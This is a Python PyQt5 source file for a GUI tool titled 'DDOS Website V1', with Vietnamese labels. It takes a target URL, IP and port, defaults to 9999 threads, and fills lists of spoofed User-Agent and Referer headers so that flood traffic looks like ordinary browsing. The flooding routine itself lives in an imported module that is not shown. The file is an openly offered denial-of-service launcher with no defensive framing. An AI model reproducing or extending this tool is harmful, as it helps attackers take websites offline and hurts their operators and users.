

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QFileDialog
import threading
import os
import socket
import httplib2
import requests
from uiDdosMain import *
import facebook
npk_msg = """Chào Mừng Bạn Đến Với Tool DDOS Của NPK
-------------------------------------------------------\n"""


class Ui_MainWindow_DDOS(object):
    def setupUi(self, MainWindow_DDOS):
        MainWindow_DDOS.setObjectName("MainWindow_DDOS")
        MainWindow_DDOS.resize(581, 347)
        icon = QtGui.QIcon(os.path.abspath("icon.png"))
        MainWindow_DDOS.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(MainWindow_DDOS)
        self.centralwidget.setObjectName("centralwidget")
        self.url = QtWidgets.QLineEdit(self.centralwidget)
        self.url.setGeometry(QtCore.QRect(40, 20, 191, 20))
        self.url.setObjectName("url")
        self.ip = QtWidgets.QLineEdit(self.centralwidget)
        self.ip.setGeometry(QtCore.QRect(40, 50, 191, 20))
        self.ip.setObjectName("ip")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(20, 20, 21, 21))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(20, 50, 21, 21))
        self.label_2.setObjectName("label_2")
        self.ip_now = QtWidgets.QLabel(self.centralwidget)
        self.ip_now.setGeometry(QtCore.QRect(20, 270, 161, 31))
        self.ip_now.setObjectName("ip_now")
        self.groupBox = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(20, 80, 301, 121))
        self.groupBox.setObjectName("groupBox")
        self.thread_ = QtWidgets.QSpinBox(self.groupBox)
        self.thread_.setGeometry(QtCore.QRect(50, 20, 50, 22))
        self.thread_.setObjectName("thread_")
        self.label_4 = QtWidgets.QLabel(self.groupBox)
        self.label_4.setGeometry(QtCore.QRect(10, 20, 41, 21))
        self.label_4.setObjectName("label_4")
        self.radio_autorun = QtWidgets.QRadioButton(self.groupBox)
        self.radio_autorun.setGeometry(QtCore.QRect(110, 20, 71, 21))
        self.radio_autorun.setObjectName("radio_autorun")
        self.radio_stop_when_susses = QtWidgets.QRadioButton(self.groupBox)
        self.radio_stop_when_susses.setGeometry(QtCore.QRect(190, 20, 101, 21))
        self.radio_stop_when_susses.setObjectName("radio_stop_when_susses")
        self.label_7 = QtWidgets.QLabel(self.groupBox)
        self.label_7.setGeometry(QtCore.QRect(10, 60, 61, 21))
        self.label_7.setObjectName("label_7")
        self.choose_useragent = QtWidgets.QPushButton(self.groupBox)
        self.choose_useragent.setGeometry(QtCore.QRect(80, 60, 75, 23))
        self.choose_useragent.setObjectName("choose_useragent")
        self.filename_useragent = QtWidgets.QLabel(self.groupBox)
        self.filename_useragent.setGeometry(QtCore.QRect(170, 60, 121, 21))
        self.filename_useragent.setObjectName("filename_useragent")
        self.label_9 = QtWidgets.QLabel(self.groupBox)
        self.label_9.setGeometry(QtCore.QRect(10, 80, 47, 20))
        self.label_9.setObjectName("label_9")
        self.choose_referer = QtWidgets.QPushButton(self.groupBox)
        self.choose_referer.setGeometry(QtCore.QRect(80, 80, 75, 23))
        self.choose_referer.setObjectName("choose_referer")
        self.filename_referer = QtWidgets.QLabel(self.groupBox)
        self.filename_referer.setGeometry(QtCore.QRect(170, 80, 121, 21))
        self.filename_referer.setObjectName("filename_referer")
        self.logs = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.logs.setGeometry(QtCore.QRect(340, 20, 231, 281))
        self.logs.setObjectName("logs")
        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(340, 0, 47, 13))
        self.label_5.setObjectName("label_5")
        self.label_6 = QtWidgets.QLabel(self.centralwidget)
        self.label_6.setGeometry(QtCore.QRect(240, 20, 31, 21))
        self.label_6.setObjectName("label_6")
        self.port = QtWidgets.QLineEdit(self.centralwidget)
        self.port.setGeometry(QtCore.QRect(280, 20, 41, 20))
        self.port.setObjectName("port")
        self.start = QtWidgets.QPushButton(self.centralwidget)
        self.start.setGeometry(QtCore.QRect(204, 270, 121, 31))
        self.start.setObjectName("start")
        self.checkip = QtWidgets.QPushButton(self.centralwidget)
        self.checkip.setGeometry(QtCore.QRect(244, 50, 81, 23))
        self.checkip.setObjectName("checkip")
        self.groupBox_2 = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox_2.setGeometry(QtCore.QRect(20, 210, 301, 51))
        self.groupBox_2.setObjectName("groupBox_2")
        self.type_socket = QtWidgets.QRadioButton(self.groupBox_2)
        self.type_socket.setGeometry(QtCore.QRect(20, 20, 61, 17))
        self.type_socket.setObjectName("type_socket")
        self.type_reqHttp = QtWidgets.QRadioButton(self.groupBox_2)
        self.type_reqHttp.setGeometry(QtCore.QRect(100, 20, 91, 17))
        self.type_reqHttp.setObjectName("type_reqHttp")
        self.type_http = QtWidgets.QRadioButton(self.groupBox_2)
        self.type_http.setGeometry(QtCore.QRect(210, 20, 82, 17))
        self.type_http.setObjectName("type_http")
        MainWindow_DDOS.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow_DDOS)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 581, 21))
        self.menubar.setObjectName("menubar")
        MainWindow_DDOS.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow_DDOS)
        self.statusbar.setObjectName("statusbar")
        MainWindow_DDOS.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow_DDOS)
        QtCore.QMetaObject.connectSlotsByName(MainWindow_DDOS)

    def retranslateUi(self, MainWindow_DDOS):
        _translate = QtCore.QCoreApplication.translate
        MainWindow_DDOS.setWindowTitle(_translate(
            "MainWindow_DDOS", "DDOS Website V1 - Nguyễn Phú Khương"))
        self.label.setText(_translate("MainWindow_DDOS", "URL"))
        self.label_2.setText(_translate("MainWindow_DDOS", "IP"))
        self.ip_now.setText(_translate("MainWindow_DDOS", "IP Hiện Tại:"))
        self.groupBox.setTitle(_translate("MainWindow_DDOS", "Cấu Hình"))
        self.label_4.setText(_translate("MainWindow_DDOS", "Luồng"))
        self.radio_autorun.setText(_translate("MainWindow_DDOS", "Auto Run"))
        self.radio_stop_when_susses.setText(
            _translate("MainWindow_DDOS", "Dừng Khi Susses"))
        self.label_7.setText(_translate("MainWindow_DDOS", "User-Agent"))
        self.choose_useragent.setText(
            _translate("MainWindow_DDOS", "Chọn Tệp"))
        self.filename_useragent.setText(
            _translate("MainWindow_DDOS", "My File"))
        self.label_9.setText(_translate("MainWindow_DDOS", "Referer"))
        self.choose_referer.setText(_translate("MainWindow_DDOS", "Chọn Tệp"))
        self.filename_referer.setText(_translate("MainWindow_DDOS", "My File"))
        self.label_5.setText(_translate("MainWindow_DDOS", "Logs"))
        self.label_6.setText(_translate("MainWindow_DDOS", "PORT"))
        self.start.setText(_translate("MainWindow_DDOS", "Start - DDOS"))
        self.checkip.setText(_translate("MainWindow_DDOS", "Check IP"))
        self.groupBox_2.setTitle(_translate("MainWindow_DDOS", "Loại Request"))
        self.type_socket.setText(_translate("MainWindow_DDOS", "Socket"))
        self.type_reqHttp.setText(_translate(
            "MainWindow_DDOS", "request.HTTP"))
        self.type_http.setText(_translate("MainWindow_DDOS", "HTTP"))
        self.logs.setPlainText(_translate("MainWindow_DDOS", npk_msg))
        self.clicked()
        self.setValue()
        threading.Thread(target=self.ip__now).start()

    def ip__now(self):
        self.ip_now.setText("IP Hiện Tại: "+requests.get("http://httpbin.org/ip").json()["origin"])

    def clicked(self):
        self.choose_useragent.clicked.connect(self.open_filename_useragent)
        self.choose_referer.clicked.connect(self.open_filename_referer)
        self.start.clicked.connect(self.start_ddos)
        self.checkip.clicked.connect(self.check_ip)

    def getnamefile(self, _pathname):
        _file_name = str(_pathname).split("/")[-1]
        return _file_name

    def setValue(self):
        countThread(self.logs,0)
        self.radio_autorun.setChecked(True)
        self.type_socket.setChecked(True)
        self.thread_.setMaximum(9999)
        self.thread_.setValue(9999)
        self.port.setText("80")
        self.url.setPlaceholderText("http://www.example.com")

    def open_filename_useragent(self):
        try:
            self.pathname_useragent = QFileDialog.getOpenFileNames()[0][0]
            self.filename_useragent.setText(
                self.getnamefile(self.pathname_useragent))
            self.logs.appendPlainText("[#]Add-File-User-Agent: " +self.getnamefile(self.pathname_useragent))
        except:
            pass

    def open_filename_referer(self):
        try:
            self.pathname_referer = QFileDialog.getOpenFileNames()[0][0]
            self.filename_referer.setText(
                self.getnamefile(self.pathname_referer))
            self.logs.appendPlainText("[#]Add-File-Referer: "+self.getnamefile(self.pathname_referer))
        except:
            pass

    def get__useragent_referer(self):
        self.headers_useragents = []
        self.headers_referers = []
        try:
            with open(self.pathname_useragent, "r") as f:
                for i in f.readlines():
                    self.headers_useragents.append(i)
        except:
            self.headers_useragents.append(
                'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
            self.headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
            self.headers_useragents.append(
                'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
            self.headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
            self.headers_useragents.append(
                'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
            self.headers_useragents.append(
                'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
        try:
            with open(self.pathname_referer, "r") as f:
                for i in f.readlines():
                    self.headers_referers.append(i)
        except:
            self.headers_referers.append('http://www.google.com/?q=')
            self.headers_referers.append(
                'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
            self.headers_referers.append('http://vk.com/profile.php?redirect=')
            self.headers_referers.append(
                'http://www.usatoday.com/search/results?q=')
            self.headers_referers.append(
                'http://engadget.search.aol.com/search?q=query?=query=..')

    def check_ip(self):
        try:
            self.hostname = self.url.text().replace("https://", "").replace("http://", "").replace("www.", "")
            self.ipweb = socket.gethostbyname(self.hostname)
            self.ip.setText(self.ipweb)
        except:
            self.ip.setText("Không tìm thấy IP")

    def start_ddos(self):
        threading.Thread(target=self._start_ddos).start()
    
    def _start_ddos(self):
        self.get__useragent_referer()
        self.call_typerequest()
        
        self.hostname = self.url.text().replace("https://", "").replace("http://", "").replace("www.", "")
        self.ip_ = socket.gethostbyname(self.hostname)
        self.logs.appendPlainText(f"[#][{self.type_request}]||[{self.ip_}]||[{str(self.port.text())}]||[{str(self.thread_.text())}]")
        self.setValueCache()
        for i in range(int(self.thread_.text())):
            try:
                _thread = StartThread()
                _thread.start()
                _thread.join()
            except:
                pass
            
            if VARIABLE.die==True:
                self.logs.appendPlainText("[#]----SUCCESS------------------")
                break

    def setValueCache(self):
        VARIABLE.headers_referers = self.headers_referers
        VARIABLE.headers_useragent = self.headers_useragents
        VARIABLE.host = self.hostname
        VARIABLE.ip = self.ip_
        VARIABLE.port = int(self.port.text())
        VARIABLE.url = self.url.text()
        VARIABLE.stop = self.radio_stop_when_susses.isChecked()
        VARIABLE.type_ = self.call_typerequest()
    
    def call_typerequest(self):
        if self.type_socket.isChecked():
            self.type_request = "Socket"
        elif self.type_reqHttp.isChecked():
            self.type_request = "Request.HTTP"
        elif self.type_http.isChecked():
            self.type_request = "HTTP"
        return self.type_request


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow_DDOS = QtWidgets.QMainWindow()
    ui = Ui_MainWindow_DDOS()
    ui.setupUi(MainWindow_DDOS)
    MainWindow_DDOS.show()
    sys.exit(app.exec_())
